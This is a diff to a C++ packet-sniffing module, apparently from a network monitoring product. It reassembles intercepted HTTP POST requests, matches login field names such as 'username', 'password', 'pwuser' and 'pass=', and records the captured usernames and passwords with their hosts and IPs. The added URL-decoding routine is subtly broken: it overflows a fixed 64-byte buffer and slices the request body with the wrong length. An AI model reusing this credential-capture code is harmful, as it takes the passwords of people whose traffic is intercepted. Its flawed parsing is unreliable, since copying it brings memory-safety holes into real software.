@@ -1,8 +1,6 @@
 
-
 #include <iostream>
 #include <map>
-#include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <net/ethernet.h>
@@ -11,8 +9,9 @@
 #include <netinet/tcp.h>
 #include <netinet/udp.h>
 #include <vector>
+#include <stdio.h>
 
-#include "libmicrocai.h"
+#include "libdreamtop.h"
 #include "kmysql.h"
 
 #include <ctime>
@@ -30,8 +29,51 @@ struct MAIL_LOGIN_KEY
 	char select[16];
 };
 
+char CharToInt(char ch){
+	if(ch>='0' && ch<='9')return (char)(ch-'0');
+	if(ch>='a' && ch<='f')return (char)(ch-'a'+10);
+	if(ch>='A' && ch<='F')return (char)(ch-'A'+10);
+	return -1;
+}
+
+char StrToBin(char *str){
+	char tempWord[2];
+	char chn;
+
+	tempWord[0] = CharToInt(str[0]);                         //make the B to 11 -- 00001011
+	tempWord[1] = CharToInt(str[1]);                         //make the 0 to 0 -- 00000000
+
+	chn = (tempWord[0] << 4) | tempWord[1];                //to change the BO to 10110000
+
+	return chn;
+}
+
+void UrlGB2312Decode(const char *pInput,int nInputLen,char *pOutput,int nOutputLen)
+{
+	char tmp[2];
+	int i=0;
+
+	while(i<nInputLen)
+	{
+		if(pInput[i]=='%')
+		{
+			tmp[0]=pInput[i+1];
+			tmp[1]=pInput[i+2];
+			pOutput[strlen(pOutput)]= StrToBin(tmp);
+			i=i+3;
+		}
+		else if(pInput[i]=='+'){
+			pOutput[strlen(pOutput)]=' ';
+			i++;
+		}
+		else{
+			pOutput[strlen(pOutput)]=pInput[i];
+			i++;
+		}
+	}
+}
 // Parameter sep is char set
-static size_t GetSepTextByChar(const std::string &strText, const char *sep, std::vector<std::string> &vec)
+size_t GetSepTextByChar(const std::string &strText, const char *sep, std::vector<std::string> &vec)
 {
 	if (sep == NULL)
 		return 0;
@@ -40,12 +82,12 @@ static size_t GetSepTextByChar(const std::string &strText, const char *sep, std:
 	while(startpos != (size_t)-1)
 	{
 		startpos = strText.find_first_not_of(sep, startpos);
-		if (startpos == (size_t)-1)
+		if (startpos ==  (size_t)-1)
 			break;
 
 		endpos = strText.find_first_of(sep, startpos);
 
-		std::string::size_type end = (endpos == (size_t) -1)?strText.size():endpos;
+		std::string::size_type end = (endpos ==  (size_t) -1)?strText.size():endpos;
 		std::string temp = strText.substr(startpos, end - startpos);
 
 		if (!temp.empty())
@@ -55,31 +97,42 @@ static size_t GetSepTextByChar(const std::string &strText, const char *sep, std:
 	return vec.size();
 }
 
-static bool ParseTcpPkt(const char* tcpdata, size_t tcpdata_len,
-				 std::string& url, std::string& usr, std::string& pwd)
+bool ParseTcpPkt(const char* tcpdata, size_t tcpdata_len, std::string& url, std::string& usr, std::string& pwd)
 {
-	//data begin with "POST"
-	if(memcmp(tcpdata,"POST ",5))
-	    return false;
-
-	//data end with "\r\n\r\n"
-	if(!strstr(tcpdata,"\r\n\r\n"))
-	  return false;
+	static std::string strHtml;
 	std::string strdata(tcpdata, tcpdata_len);
 
-	size_t pos = std::string::npos;
-	if ((pos = strdata.find("\r\n\r\n")) == std::string::npos)
+	//data begin with "POST"
+	if (strdata.find("POST") != 0 && strHtml == "")
 		return false;
 
+	strHtml += strdata;
 
+	size_t pos = std::string::npos;
+	if ((pos = strHtml.find("\r\n\r\n", 0)) == std::string::npos)
+		return false;
 
-	std::string html_header = strdata.substr(0, pos+4);
-	std::string html_body = strdata.substr(pos+4, strdata.size() -pos-4);
+	std::string html_header = strHtml.substr(0, pos+4);
+	std::string html_body = strHtml.substr(pos+4, strdata.size() -pos-4);
 
+	//get the html field "Content Length"
+	size_t p1 = std::string::npos, p2 = std::string::npos;
+	if ((p1 = html_header.find("Content-Length: ")) == std::string::npos ||
+		(p2 = html_header.find("\r\n", p1)) == std::string::npos)
+	{
+		strHtml = "";
+		return false;
+	}
+	p1 += strlen("Content-Length: ");
+	std::string content_len = html_header.substr(p1, p2-p1);
+	size_t len = atoi(content_len.c_str());
+
+	if (len> html_body.size())
+		return false;
+
+	strHtml = "";
 
 	//url
-	size_t p1 = std::string::npos, p2 = std::string::npos;
-
 	if ((p1 = html_header.find("Host: ")) == std::string::npos ||
 		(p2 = html_header.find("\r\n", p1)) == std::string::npos)
 		return false;
@@ -109,6 +162,8 @@ static bool ParseTcpPkt(const char* tcpdata, size_t tcpdata_len,
 	keyword_map.insert(std::make_pair("username", "password"));
 	keyword_map.insert(std::make_pair("username", "passwd"));
 	keyword_map.insert(std::make_pair("pwuser", "pwpwd"));
+	keyword_map.insert(std::make_pair("name", "pwd"));
+	keyword_map.insert(std::make_pair("vwriter", "vpassword"));
 
 	std::multimap<std::string, std::string>::iterator it_map = keyword_map.begin();
 	for (; it_map != keyword_map.end(); ++it_map)
@@ -118,6 +173,17 @@ static bool ParseTcpPkt(const char* tcpdata, size_t tcpdata_len,
 		{
 			usr = usr_pwd_map[it_map->first];
 			pwd = usr_pwd_map[it_map->second];
+
+			if (usr.size() >64 || pwd.size()>64)
+				return false;
+
+			char szUser[64] = {0};
+			char szPassword[64] = {0};
+			UrlGB2312Decode(usr.c_str(), usr.size(), szUser, strlen(szUser));
+			UrlGB2312Decode(pwd.c_str(), pwd.size(), szPassword, strlen(szPassword));
+
+			usr = szUser;
+			pwd = szPassword;
 			return true;
 		}
 	}
@@ -125,13 +191,14 @@ static bool ParseTcpPkt(const char* tcpdata, size_t tcpdata_len,
 	return false;
 }
 
+
 static int RecordPOST(const char *user, const char*pswd, const char*host, u_char*packet,in_addr_t sip,in_addr_t dip)
 {
 	struct NetAcount na(NetAcountType_POST,packet);// = (struct NetAcount*)malloc(8190);
 
 	struct tcphdr* tcp = (tcphdr*)(packet + 14 + sizeof(iphdr));
 
-	char	strhost[32];
+	char strhost[32];
 	snprintf(strhost,32,"%d.%d.%d.%d",((u_char*)&dip)[0],((u_char*)&dip)[1],((u_char*)&dip)[2],((u_char*)&dip)[3]);
 
 	na.data = host;
@@ -146,9 +213,8 @@ static int RecordPOST(const char *user, const char*pswd, const char*host, u_char
 	na.host = strhost;
 	na.dport = ntohs(tcp->dest);
 
-    RecordAccout(&na);
-    log_puts(L_DEBUG_OUTPUT_MORE,user);
-    return 1;
+	RecordAccout(&na);
+	return 1;
 }
 
 static int RecordUrl(char *url,u_char*packet,in_addr_t sip,in_addr_t dip)
@@ -162,7 +228,7 @@ static int RecordUrl(char *url,u_char*packet,in_addr_t sip,in_addr_t dip)
 	while ((nstart = strUrl.find('/', nstart +1)) != std::string::npos)
 		++count_splash;
 
-	if (count_splash >3)
+	if (count_splash >4)
 		return 0;
 
 	time_t tmNow = time(NULL);
@@ -186,7 +252,6 @@ static int RecordUrl(char *url,u_char*packet,in_addr_t sip,in_addr_t dip)
 	url_time_map[strUrl] = tmNow;
 	pthread_mutex_unlock(&lock);
 
-    log_printf(L_DEBUG_OUTPUT_MORE,"URL is %s\n",url);
     struct NetAcount na(NetAcountType_HTTP,packet);// = (struct NetAcount*)malloc(8190);
 
 	na.data = url;
@@ -226,7 +291,7 @@ static int GetHttpPost(struct so_data*, u_char*packet)
 	{
 		return RecordPOST(usr.c_str(), pwd.c_str(), url.c_str(), packet,ip_head->saddr, ip_head->daddr);
 	}
-	return 1;
+	return 0;
 	//end 090901
 
 	HOSTDATA* pHostData;
@@ -250,31 +315,32 @@ static int GetHttpPost(struct so_data*, u_char*packet)
 
 	if (!pHostData)
 	{
-		if (memcmp("POST ", tcpdata, 5))
-			return 0;
-
-		char *pPos = NULL;
-		pPos = strstr((char *) tcpdata, "Host:");
-		if (!pPos) return 0 ;
-
-		pPos = pPos + 6;
-		char *pTemp = strstr(pPos, "\r\n");
-		if (pTemp)
+		if (memcmp("POST ", tcpdata, 5) == 0)
 		{
-			if (pTemp - pPos >= nSize)
-				return 0;
-			if (pTemp - pPos < 4)
-				return 0;
-			strncpy(pHost, pPos, pTemp - pPos);
-			HOSTDATA HostData;
-			inet_neta(ip_head->daddr, HostData.strIP, 20);
-			strcpy(HostData.strHost, pHost);
-			pthread_mutex_lock(&lock);
-			if (host_list.size() > 2000)
-				host_list.erase(host_list.begin());
-			host_list.insert(std::pair<in_addr_t, HOSTDATA>(
-					ip_head->daddr, HostData));
-			pthread_mutex_unlock(&lock);
+			char *pPos = NULL;
+			pPos = strstr((char *) tcpdata, "Host:");
+			if (pPos)
+			{
+				pPos = pPos + 6;
+				char *pTemp = strstr(pPos, "\r\n");
+				if (pTemp)
+				{
+					if (pTemp - pPos >= nSize)
+						return 0;
+					if (pTemp - pPos < 4)
+						return 0;
+					strncpy(pHost, pPos, pTemp - pPos);
+					HOSTDATA HostData;
+					inet_neta(ip_head->daddr, HostData.strIP, 20);
+					strcpy(HostData.strHost, pHost);
+					pthread_mutex_lock(&lock);
+					if (host_list.size() > 2000)
+						host_list.erase(host_list.begin());
+					host_list.insert(std::pair<in_addr_t, HOSTDATA>(
+							ip_head->daddr, HostData));
+					pthread_mutex_unlock(&lock);
+				}
+			}
 		}
 	}
 	else
@@ -292,22 +358,17 @@ static int GetHttpPost(struct so_data*, u_char*packet)
 	{ "account=", "pass=", "&" },
 	{ "account=", "password=", "&" },
 	{ "pwuser=", "pass=", "&" },
-	{ {0},{ 0}, {0} } };
-	tcpdata = strstr(tcpdata,"\r\n\r\n");
-
-	if(!tcpdata)
-		return 0;
+	{ "", "", "" } };
 
 	for (int i = 0;; i++)
 	{
 		MAIL_LOGIN_KEY &key = loginKeys[i];
 
-		if (!key.user)
+		if (strlen(key.user) == 0)
 			break;
 
 		char *pPos = NULL;
 		char *pTemp = NULL;
-
 		pPos = strstr((char *) tcpdata, key.user);
 		if (pPos)
 		{
@@ -320,7 +381,6 @@ static int GetHttpPost(struct so_data*, u_char*packet)
 					if (pTemp - pPos >= nSize)
 						continue;
 					strncpy(pUser, pPos, pTemp - pPos);
-					//log_printf(L_DEBUG_OUTPUT,"username: % \n", pUser);
 				}
 				else
 					continue;
